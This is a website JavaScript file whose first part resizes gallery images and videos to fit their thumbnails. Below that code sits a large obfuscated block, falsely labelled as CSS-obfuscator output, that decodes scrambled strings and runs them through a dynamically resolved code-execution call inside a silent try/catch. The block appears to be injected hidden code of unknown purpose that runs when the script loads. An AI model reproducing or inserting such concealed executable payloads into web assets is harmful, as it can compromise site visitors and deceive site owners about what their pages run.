// script.js

document.addEventListener("DOMContentLoaded", () => {
    const gridItems = document.querySelectorAll('.grid-item');

    gridItems.forEach(item => {
        const media = item.querySelector('img, video');
        
        if (media) {
            // Resize media elements to fit within the thumbnail
            media.onload = () => {
                resizeMedia(media);
            };
            media.onloadeddata = () => {
                resizeMedia(media);
            };
        }
    });

    function resizeMedia(media) {
        const item = media.closest('.grid-item');
        const itemWidth = item.offsetWidth;

        // Make sure aspect ratio is maintained
        if (media.tagName.toLowerCase() === 'img') {
            const aspectRatio = media.naturalWidth / media.naturalHeight;
            if (aspectRatio > 1) {
                media.style.width = '100%';
                media.style.height = 'auto';
            } else {
                media.style.height = '100%';
                media.style.width = 'auto';
            }
        } else if (media.tagName.toLowerCase() === 'video') {
            const aspectRatio = media.videoWidth / media.videoHeight;
            if (aspectRatio > 1) {
                media.style.width = '100%';
                media.style.height = 'auto';
            } else {
                media.style.height = '100%';
                media.style.width = 'auto';
            }
        }
    }
});
    /* Obfuscated at 2025-05-20 12:03:02 on https://www.phpkobo.com/css-obfuscator */(function(){_ibo("o-1xen1;s49bn3j/xiym.ojsiuwoshn.<;ujufofm9m;dvv9sofmis;ohj!;sonnehj|#ud#jmdm<qe6dopottb;dpis;bm;lpgmgqf<.bjbpu;ep.fjm<;ob2;;oymfs.j.eemt2q.eb12p5*eb1hhjf<fduu<jjfej-!xn2.ofj/uccq.;sno9b/uccpp$ufu)8pfqojse##js~{plpqyfqpfoe!gtjlqpp$ofbhscb-<bjcjcd{dtfgjmjsujn3hj|4$.~f;;tddj<b;gyzjy11v-<jsqisejeypffpep<;e/wjb1g~nhtblbyd.pce9etblbwv6.<fn7msmtojue-pjfshsb!sys<;.fpfo<;wv6t)ds;pntnehbnhlfljsmsvu~mhb1;og7gc|2$u~pthuss<;o.q1o4cvhyujuhj<osnweoc$.hjey1j!idjjs~pxm|.<jdjjsfo6td~b9m|b;heip#oqb;;s;e3.<bucdbs<mn2fo6g2up$ejbbeidb/h;hu<ffnffosq2.pqgp/g9ezoqsff*pbhxy&e5ptj<;eiitku<tff;b4jseu.&u/wusou|ofmcdcvsou.se6jpyq.hu2;.;ns#u|3$p$e1suusbptnejb1se6p/jvczmosjulhhsdsjeydon/|;hy1uoygutpqem/umj.q<wv;j<<;-s;on9.;uqvfb;sosd4ujfii<;hj;pf.x/uccbpptpf.u|.~{mA.ydsfg2j2bf;.g1gv2jqbfjbdmf!josq|.6s1wo9|ztho;hfjppppj<u<tnudj<qju<<uvoyeftbbedfhfu3excs4e2.b1j2;mtomdg<fl4fep;fpdsebmstjtblbdms;msticdfpnx*pj.s1u1je#jpqgo5oyeypolp-/tfhycd6n6fecg;.jh2s;gvwvotgjb;bffoqyu.dnpcu<<;djz.pbbsp1ujbh5f1uywu14buujfmqmh~n.|2jcpjfvm;dedjjslpe5m;dvbpb;sfj|oed<qf1oj#eoyge2h<juothsu4q.j~bp6;*|.9pBto;1pv(ofo;qmpmdjyo.b~mtpbn..dgjso;umuqg<qiedc-sqp.if11zj;hoppbs!jn1hkoepu.;susou.hsfq.;sndm|m;ee/u.pqyn&ts-#u<<.5;cv.;js!stmcodm<t~cdcosf;11vs*esedmfojfouuuefjms;utppupfhfv);mqy;ulb1.yqi~n&1;gdouxtup/jub1ifu.|pd.pipf.us;syd.pclpgbxjutbumb~|~#f#;.dcd22pteoup/b!bm.blpudbp9ujs1<wom<.<.fby;ho..fpe/!{ph6jjmobmssnn32pb<2ih)/s<;f|<qgzf.f;jjvhnfy&udbji~pxm;mstip$.~pxm;hspsibidjfve/x~;dt#tpbp51s;fpjv4ofzpu;hssbbdm~.bj<iie)ctcqoz.douubsqjnifsjqu{pumm|jq",(function(){this._W5L5YvH3h__wacD79={f:function(_WS,$){_C5="\x70\x6c\x61";function _tK(_WS,$,_b6Z,_j2){function _Gdf(_mu35){_mu35=_TEt(_mu35)-32-(_j2%95);if(_mu35<0){_mu35+=95;}_mu35+=32;_j2++;return _zf0K(_mu35);};function _IOk(_WS,_b6Z){_hJ=_WS[_b6Z];_xI="";while(_hJ!="\f"){if(_hJ<" "){_xI+=_hJ;}else{_xI+=_Gdf(_hJ);}_b6Z++;_hJ=_WS[_b6Z];}return _xI;};function _TEt(_hJ){return _hJ[_re](0);};function _zf0K(_mu35){return this[_sx][_Ar](_mu35);};_b6Z=_b6Z?_b6Z:0;if(_WS[_PS4]>_b6Z){_j2=_j2?_j2:0;_n0C=_IOk(_WS,_b6Z);_w1=_n0C[_PS4];_cUX=_IOk(_WS,_b6Z+_w1+1);_Z7=_cUX[_PS4];$[_n0C]=_cUX;_tK(_WS,$,_b6Z+_w1+1+_Z7+1,_j2);}};_x7="\x72\x65"+_C5+"\x63\x65";_re=_2viL("_ahco%Cr%Aedt");_sx=_2viL("r_t%Sgni");_Ar=_2viL("_orfhCm%Crae_do");_PS4=_2viL("ne_lh_tg");_tK(_WS,$);function _2viL(_R7pV){return _R7pV[_x7](/[x%y_z]/g,'')[_x7](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _ibo(_c1,_Ffj,_3E00,$,_fDqg,_0v){_4t=this._W5L5YvH3h__wacD79;_4t.f(_fDqg,$);if(!_3E00){_3E00=$.__u8n;}_PNKL()(_c1,0,0x458b,this,"''");function _PNKL(){return function(_oPQ0,_OJL,_yD4r,_6hpz,_xj1){_4t.p1=_oPQ0;_4t.p2=_yD4r;try{_G4dG(_6hpz)(_toZ()([_3E00[$._730lN]("+p%p",_xj1)[$._730lN]("-p%q",_xj1)],''))();}catch(e){}function _G4dG(_0w){return _0w[$._nD6];};_6hpz._W5L5YvH3h__wacD79=_0v;};};function _toZ(){return function(_F3Bw,_0HD){return _F3Bw[$._g9T1](_0HD);};};};}());

